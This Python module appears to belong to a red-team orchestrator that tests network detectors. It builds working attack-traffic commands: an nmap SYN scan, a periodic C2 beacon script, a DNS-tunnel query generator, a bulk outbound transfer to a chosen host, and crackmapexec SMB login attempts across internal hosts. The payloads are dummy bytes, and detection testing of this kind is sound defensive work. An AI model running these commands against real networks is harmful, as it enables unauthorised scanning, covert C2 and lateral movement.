"""Attack-action library for the Stage-5 red-team orchestrator.

Each builder returns an action = {id, behavior, attacker, targets, cmd}: the behaviour CLASS matches
the scorer taxonomy (recon/c2/exfil/lateral), attacker+targets are the independent-truth entities,
and `cmd` is the REAL command that puts the traffic on the wire. Commands assume the tools are present
and an ISOLATED target range (never point these at anything you do not own). Swap tools/targets per
lab; the orchestrator's truth is derived from attacker/targets/behavior, not from the specific tool.
"""


def scan(attacker, targets, ports="445,3389", behavior="lateral"):
    """SYN scan across internal hosts. targets = the scanned host IPs (independent truth). Keyed on the
    INITIATOR (match_requires): a fan-out is identified by the source, and a real detector finding for
    it names the source + an aggregate count, not every dst. `behavior` defaults to "lateral" because
    an internal scan on SMB/RDP ports is the one-host-probes-many-internal-hosts pattern the east-west
    tier surfaces as lateral_movement / rdp_fanout; use behavior="recon" for a general port sweep."""
    return {"id": "rt-scan", "behavior": behavior, "attacker": attacker, "targets": list(targets),
            "match_requires": [attacker], "cmd": ["nmap", "-sS", "-n", "-p", ports, *targets]}


# Attack scripts take their parameters from argv (NOT string interpolation) so the body is a constant
# with no brace/backslash escaping hazards, and each prints a machine-readable `RT-OUTCOME {json}` line
# reporting ACTUAL execution facts (attempts/ok/errors/bytes). The orchestrator parses that to record
# ACHIEVED vs merely attempted (R08/§33.4) — a zero exit no longer implies the behaviour occurred.
_BEACON_SRC = r'''
import socket, time, json, sys
c2, port, count, interval = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), float(sys.argv[4])
ok = err = 0
for _ in range(count):
    s = socket.socket(); s.settimeout(5)
    try:
        s.connect((c2, port)); s.sendall(b'\x17\x03\x03\x00 ' + b'x' * 32); ok += 1
    except OSError:
        err += 1
    finally:
        s.close()
    time.sleep(interval)
print('RT-OUTCOME ' + json.dumps({'attempts': count, 'ok': ok, 'errors': err, 'connections': ok}))
'''

_DNS_SRC = r'''
import socket, os, base64, json, sys
base_domain, queries = sys.argv[1], int(sys.argv[2])
ok = err = 0
for _ in range(queries):
    lbl = base64.b32encode(os.urandom(20)).decode().strip('=').lower()[:40]
    try:
        socket.getaddrinfo(lbl + '.' + base_domain, 53); ok += 1
    except OSError:
        err += 1
print('RT-OUTCOME ' + json.dumps({'attempts': queries, 'ok': ok, 'errors': err}))
'''

_EXFIL_SRC = r'''
import socket, json, sys
dest, port, mb = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
sent = 0; connected = 0
s = socket.socket(); s.settimeout(15)
try:
    s.connect((dest, port)); connected = 1
    b = b'x' * 65536
    for _ in range(mb * 16):
        s.sendall(b); sent += len(b)
except OSError:
    pass
finally:
    s.close()
print('RT-OUTCOME ' + json.dumps({'connected': connected, 'bytes': sent, 'target_bytes': mb * 1024 * 1024}))
'''


def beacon(attacker, c2, interval=5, count=20, port=443):
    """A periodic C2 beacon with no signature (c2). A scripted regular caller — the behavioural gap
    raw Suricata misses. targets = [c2]. Reports connections made (ok) so an absent listener is
    recorded as ATTEMPTED, not a completed callback pattern (R08)."""
    return {"id": "rt-beacon", "behavior": "c2", "attacker": attacker, "targets": [c2],
            "cmd": ["python3", "-c", _BEACON_SRC, c2, str(port), str(count), str(interval)]}


def dns_tunnel(attacker, resolver, base_domain, queries=60):
    """High-entropy/high-cardinality DNS to one base domain (exfil via DNS tunnel). targets=[resolver].
    Resolution uses the system resolver; `resolver` is the independent-truth target."""
    return {"id": "rt-dns-tunnel", "behavior": "exfil", "attacker": attacker, "targets": [resolver],
            "cmd": ["python3", "-c", _DNS_SRC, base_domain, str(queries)]}


def exfil(attacker, dest, mb=50, port=443):
    """A single large outbound transfer (exfil / large_transfer). targets=[dest]. A socket timeout
    bounds the transfer so a slow/echoing/absent peer can never deadlock the sender (§stage5 live
    safety); the RT-OUTCOME reports bytes ACTUALLY sent so a partial/failed transfer is not scored as a
    completed exfil (R08)."""
    return {"id": "rt-exfil", "behavior": "exfil", "attacker": attacker, "targets": [dest],
            "cmd": ["python3", "-c", _EXFIL_SRC, dest, str(port), str(mb)]}


def lateral(attacker, targets, user="svc", pw="x"):
    """East-west lateral movement / SMB fan-out (lateral). targets = the internal hosts hit.
    Uses crackmapexec if present; the truth is the attacker->targets relationship regardless of tool."""
    return {"id": "rt-lateral", "behavior": "lateral", "attacker": attacker, "targets": list(targets),
            "cmd": ["crackmapexec", "smb", *targets, "-u", user, "-p", pw]}
